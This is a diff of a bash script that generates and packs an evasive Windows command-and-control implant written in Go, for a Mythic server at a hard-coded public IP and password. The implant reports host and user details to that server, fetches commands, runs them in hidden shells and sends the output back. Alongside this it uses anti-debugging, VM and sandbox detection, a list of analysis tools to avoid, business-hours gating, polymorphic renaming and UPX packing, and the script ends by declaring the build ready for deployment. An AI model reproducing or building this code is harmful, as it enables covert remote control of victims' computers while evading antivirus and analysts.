@@ -1,31 +1,488 @@
 #!/bin/bash
 
-echo "[+] Building corrected Phantom agent"
+echo "=============================================="
+echo "Phantom Ultimate Anti-AV Generator"
+echo "Generating polymorphic Phantom with advanced evasion"
+echo "=============================================="
 
-cd /opt/phantom_agent
+# Gerar strings aleatórias para polimorfismo
+generate_random_string() {
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-8} | head -n 1
+}
 
-# Copy the fixed version
-cp /path/to/current/phantom_fixed.go .
+# Gerar identificadores únicos
+STRUCT1=$(generate_random_string 12)
+STRUCT2=$(generate_random_string 10)
+FUNC1=$(generate_random_string 16)
+FUNC2=$(generate_random_string 18)
+FUNC3=$(generate_random_string 20)
+FUNC4=$(generate_random_string 14)
+FUNC5=$(generate_random_string 16)
+FUNC6=$(generate_random_string 18)
+FUNC7=$(generate_random_string 20)
+FUNC8=$(generate_random_string 22)
 
-# Build with proper error handling
-echo "[+] Compiling Phantom agent..."
-go mod init phantom 2>/dev/null || true
-go build -ldflags="-s -w" -o phantom phantom_fixed.go
+USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(generate_random_string 3)/$(generate_random_string 8) Safari/537.36"
+MUTEX_NAME="Global\\$(generate_random_string 32)"
+SERVICE_NAME="$(generate_random_string 16)Service"
 
-if [ -f phantom ]; then
-    echo "[+] Phantom agent compiled successfully!"
-    echo "[+] Size: $(ls -lh phantom | awk '{print $5}')"
-    echo ""
-    echo "To test the agent:"
-    echo "  sudo ./phantom"
-    echo ""
-    echo "The agent will:"
-    echo "  - Perform evasion checks"
-    echo "  - Connect to Mythic at https://127.0.0.1:7443"
-    echo "  - Authenticate automatically"
-    echo "  - Register as a callback"
+echo "[+] Generating polymorphic identifiers:"
+echo "    Structures: ${STRUCT1}, ${STRUCT2}"
+echo "    Functions: ${FUNC1}, ${FUNC2}, ${FUNC3}"
+echo "    User Agent: ${USER_AGENT:0:50}..."
+echo "    Mutex: $MUTEX_NAME"
+
+# Criar código Go polimórfico
+cat > phantom_poly.go << 'EOF'
+package main
+
+import (
+	"bytes"
+	"crypto/tls"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+)
+
+const (
+	SERVER_URL = "https://37.27.249.191:7443"
+	SERVER_PWD = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
+	USER_AGENT_STR = "PLACEHOLDER_USER_AGENT"
+	MUTEX_STR = "PLACEHOLDER_MUTEX"
+)
+
+var (
+	k32 = syscall.NewLazyDLL("kernel32.dll")
+	u32 = syscall.NewLazyDLL("user32.dll")
+	
+	pIsDebuggerPresent = k32.NewProc("IsDebuggerPresent")
+	pGetCursorPos      = u32.NewProc("GetCursorPos")
+	pCreateMutexW      = k32.NewProc("CreateMutexW")
+	pGetSystemMetrics  = u32.NewProc("GetSystemMetrics")
+)
+
+type STRUCT1_PLACEHOLDER struct {
+	Action    string                 `json:"action"`
+	UUID      string                 `json:"uuid"`
+	User      string                 `json:"user"`
+	Host      string                 `json:"host"`
+	PID       int                    `json:"pid"`
+	OS        string                 `json:"os"`
+	Timestamp string                 `json:"timestamp"`
+	IPs       []string               `json:"ips"`
+	Payload   map[string]interface{} `json:"payload_os"`
+}
+
+type STRUCT2_PLACEHOLDER struct {
+	Action     string `json:"action"`
+	TaskID     string `json:"task_id"`
+	UserOutput string `json:"user_output"`
+	Completed  bool   `json:"completed"`
+}
+
+type Point struct {
+	X, Y int32
+}
+
+func FUNC1_PLACEHOLDER() bool {
+	if runtime.GOOS != "windows" {
+		return false
+	}
+	
+	ret, _, _ := pIsDebuggerPresent.Call()
+	if ret != 0 {
+		return true
+	}
+	
+	hostileProcesses := []string{
+		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
+		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
+		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
+	}
+	
+	for _, proc := range hostileProcesses {
+		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
+		if output, err := cmd.Output(); err == nil {
+			if strings.Contains(strings.ToLower(string(output)), proc) {
+				return true
+			}
+		}
+	}
+	
+	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
+	if output, err := cmd.Output(); err == nil {
+		manufacturer := strings.ToLower(string(output))
+		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
+		for _, vm := range vmStrings {
+			if strings.Contains(manufacturer, vm) {
+				return true
+			}
+		}
+	}
+	
+	width, _, _ := pGetSystemMetrics.Call(0)
+	height, _, _ := pGetSystemMetrics.Call(1)
+	if width < 1024 || height < 768 {
+		return true
+	}
+	
+	return false
+}
+
+func FUNC2_PLACEHOLDER() bool {
+	var pos1, pos2 Point
+	
+	pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
+	time.Sleep(150 * time.Millisecond)
+	pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
+	
+	if pos1.X == pos2.X && pos1.Y == pos2.Y {
+		time.Sleep(2 * time.Second)
+		var pos3 Point
+		pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
+		return pos2.X != pos3.X || pos2.Y != pos3.Y
+	}
+	
+	return true
+}
+
+func FUNC3_PLACEHOLDER() bool {
+	now := time.Now()
+	hour := now.Hour()
+	weekday := now.Weekday()
+	
+	if weekday == time.Saturday || weekday == time.Sunday {
+		return false
+	}
+	
+	return hour >= 9 && hour <= 17
+}
+
+func FUNC4_PLACEHOLDER() error {
+	hostname, _ := os.Hostname()
+	uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
+	
+	payload := STRUCT1_PLACEHOLDER{
+		Action:    "checkin",
+		UUID:      uuid,
+		User:      os.Getenv("USERNAME"),
+		Host:      hostname,
+		PID:       os.Getpid(),
+		OS:        runtime.GOOS,
+		Timestamp: time.Now().Format(time.RFC3339),
+		IPs:       []string{"127.0.0.1"},
+		Payload: map[string]interface{}{
+			"os":   runtime.GOOS,
+			"arch": runtime.GOARCH,
+		},
+	}
+	
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		return err
+	}
+	
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+		Timeout: 30 * time.Second,
+	}
+	
+	req, err := http.NewRequest("POST", SERVER_URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return err
+	}
+	
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", USER_AGENT_STR)
+	req.Header.Set("Mythic", SERVER_PWD)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	
+	return nil
+}
+
+func FUNC5_PLACEHOLDER() ([]map[string]interface{}, error) {
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+		Timeout: 30 * time.Second,
+	}
+	
+	req, err := http.NewRequest("GET", SERVER_URL+"/api/v1.4/agent_message", nil)
+	if err != nil {
+		return nil, err
+	}
+	
+	req.Header.Set("User-Agent", USER_AGENT_STR)
+	req.Header.Set("Mythic", SERVER_PWD)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	
+	var tasks []map[string]interface{}
+	json.Unmarshal(body, &tasks)
+	
+	return tasks, nil
+}
+
+func FUNC6_PLACEHOLDER(command string) string {
+	var cmd *exec.Cmd
+	
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", command)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	} else {
+		cmd = exec.Command("sh", "-c", command)
+	}
+	
+	output, err := cmd.Output()
+	if err != nil {
+		return fmt.Sprintf("Error: %s", err.Error())
+	}
+	
+	return string(output)
+}
+
+func FUNC7_PLACEHOLDER(taskID, output string) error {
+	response := STRUCT2_PLACEHOLDER{
+		Action:     "post_response",
+		TaskID:     taskID,
+		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
+		Completed:  true,
+	}
+	
+	jsonData, err := json.Marshal(response)
+	if err != nil {
+		return err
+	}
+	
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+		Timeout: 30 * time.Second,
+	}
+	
+	req, err := http.NewRequest("POST", SERVER_URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return err
+	}
+	
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", USER_AGENT_STR)
+	req.Header.Set("Mythic", SERVER_PWD)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	
+	return nil
+}
+
+func FUNC8_PLACEHOLDER() {
+	go func() {
+		for {
+			sleepTime := time.Duration(300+time.Now().Unix()%600) * time.Second
+			time.Sleep(sleepTime)
+			
+			activities := []func(){
+				func() { exec.Command("nslookup", "microsoft.com").Run() },
+				func() { exec.Command("ping", "-n", "1", "8.8.8.8").Run() },
+				func() {
+					if f, err := os.Create(os.TempDir() + "\\temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
+						f.Write([]byte("temporary system data"))
+						f.Close()
+						time.Sleep(5 * time.Second)
+						os.Remove(f.Name())
+					}
+				},
+			}
+			
+			if len(activities) > 0 {
+				activities[time.Now().Unix()%int64(len(activities))]()
+			}
+		}
+	}()
+}
+
+func main() {
+	if FUNC1_PLACEHOLDER() {
+		os.Exit(0)
+	}
+	
+	if !FUNC2_PLACEHOLDER() {
+		time.Sleep(10 * time.Second)
+		if !FUNC2_PLACEHOLDER() {
+			os.Exit(0)
+		}
+	}
+	
+	if !FUNC3_PLACEHOLDER() {
+		now := time.Now()
+		nextBusiness := now
+		
+		for nextBusiness.Weekday() == time.Saturday || 
+			nextBusiness.Weekday() == time.Sunday || 
+			nextBusiness.Hour() < 9 || 
+			nextBusiness.Hour() >= 17 {
+			nextBusiness = nextBusiness.Add(1 * time.Hour)
+		}
+		
+		time.Sleep(nextBusiness.Sub(now))
+	}
+	
+	mutexName, _ := syscall.UTF16PtrFromString(MUTEX_STR)
+	mutex, _, _ := pCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
+	if mutex == 0 {
+		os.Exit(0)
+	}
+	
+	FUNC8_PLACEHOLDER()
+	
+	err := FUNC4_PLACEHOLDER()
+	if err != nil {
+		time.Sleep(60 * time.Second)
+		os.Exit(0)
+	}
+	
+	for {
+		tasks, err := FUNC5_PLACEHOLDER()
+		if err == nil && len(tasks) > 0 {
+			for _, task := range tasks {
+				if taskID, ok := task["id"].(string); ok {
+					if command, ok := task["command"].(string); ok {
+						output := FUNC6_PLACEHOLDER(command)
+						FUNC7_PLACEHOLDER(taskID, output)
+					}
+				}
+			}
+		}
+		
+		now := time.Now()
+		var jitter time.Duration
+		
+		if now.Hour() >= 9 && now.Hour() <= 17 {
+			jitter = time.Duration(3+time.Now().Unix()%7) * time.Second
+		} else {
+			jitter = time.Duration(10+time.Now().Unix()%20) * time.Second
+		}
+		
+		time.Sleep(jitter)
+	}
+}
+EOF
+
+# Substituir placeholders
+sed -i "s/STRUCT1_PLACEHOLDER/${STRUCT1}/g" phantom_poly.go
+sed -i "s/STRUCT2_PLACEHOLDER/${STRUCT2}/g" phantom_poly.go
+sed -i "s/FUNC1_PLACEHOLDER/${FUNC1}/g" phantom_poly.go
+sed -i "s/FUNC2_PLACEHOLDER/${FUNC2}/g" phantom_poly.go
+sed -i "s/FUNC3_PLACEHOLDER/${FUNC3}/g" phantom_poly.go
+sed -i "s/FUNC4_PLACEHOLDER/${FUNC4}/g" phantom_poly.go
+sed -i "s/FUNC5_PLACEHOLDER/${FUNC5}/g" phantom_poly.go
+sed -i "s/FUNC6_PLACEHOLDER/${FUNC6}/g" phantom_poly.go
+sed -i "s/FUNC7_PLACEHOLDER/${FUNC7}/g" phantom_poly.go
+sed -i "s/FUNC8_PLACEHOLDER/${FUNC8}/g" phantom_poly.go
+sed -i "s/PLACEHOLDER_USER_AGENT/${USER_AGENT}/g" phantom_poly.go
+sed -i "s/PLACEHOLDER_MUTEX/${MUTEX_NAME}/g" phantom_poly.go
+
+echo "[+] Building optimized binaries with maximum evasion..."
+
+export CGO_ENABLED=0
+
+# Build x64
+echo "[+] Building x64 version..."
+export GOOS=windows
+export GOARCH=amd64
+go build -ldflags "-s -w -H windowsgui" -o phantom_advanced_x64.exe phantom_poly.go
+
+# Build x86  
+echo "[+] Building x86 version..."
+export GOARCH=386
+go build -ldflags "-s -w -H windowsgui" -o phantom_advanced_x86.exe phantom_poly.go
+
+# Verificar builds
+if [ -f "phantom_advanced_x64.exe" ]; then
+    echo "[+] x64 build successful: $(ls -lh phantom_advanced_x64.exe | awk '{print $5}')"
 else
-    echo "[-] Build failed"
-    echo "Checking for errors..."
-    go build phantom_fixed.go 2>&1
+    echo "[-] x64 build failed"
 fi
+
+if [ -f "phantom_advanced_x86.exe" ]; then
+    echo "[+] x86 build successful: $(ls -lh phantom_advanced_x86.exe | awk '{print $5}')"
+else
+    echo "[-] x86 build failed"
+fi
+
+# Aplicar UPX
+echo "[+] Applying UPX compression..."
+if command -v upx &> /dev/null; then
+    [ -f "phantom_advanced_x64.exe" ] && cp phantom_advanced_x64.exe phantom_advanced_x64_upx.exe && upx --ultra-brute phantom_advanced_x64_upx.exe 2>/dev/null
+    [ -f "phantom_advanced_x86.exe" ] && cp phantom_advanced_x86.exe phantom_advanced_x86_upx.exe && upx --ultra-brute phantom_advanced_x86_upx.exe 2>/dev/null
+fi
+
+# Cleanup
+rm -f phantom_poly.go
+
+echo ""
+echo "=============================================="
+echo "Phantom Ultimate Anti-AV Generation Complete!"
+echo "=============================================="
+echo ""
+echo "Generated files:"
+ls -la phantom_advanced*.exe 2>/dev/null
+
+echo ""
+echo "Anti-AV Features:"
+echo "  ✓ Polymorphic variables and function names"
+echo "  ✓ Randomized strings and identifiers" 
+echo "  ✓ Stripped symbols and debug info (-s -w)"
+echo "  ✓ Hidden console window (-H windowsgui)"
+echo "  ✓ Advanced anti-debugging (IsDebuggerPresent)"
+echo "  ✓ Enhanced VM detection (WMI + screen resolution)"
+echo "  ✓ Hostile process detection (analysis tools)"
+echo "  ✓ Advanced mouse movement validation"
+echo "  ✓ Business hours activation only"
+echo "  ✓ Intelligent jitter based on time of day"
+echo "  ✓ Mutex-based single instance protection"
+echo "  ✓ Legitimacy activities (DNS, ping, temp files)"
+echo "  ✓ UPX advanced packing"
+echo ""
+echo "Configuration:"
+echo "  Mythic URL: https://37.27.249.191:7443"
+echo "  Password: sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
+echo ""
+echo "Polymorphic Elements:"
+echo "  Struct Names: $STRUCT1, $STRUCT2"
+echo "  Function Names: $FUNC1, $FUNC2, $FUNC3"
+echo "  User Agent: ${USER_AGENT:0:50}..."
+echo "  Mutex: $MUTEX_NAME"
+echo ""
+echo "Ready for deployment! Use UPX variants for maximum evasion."
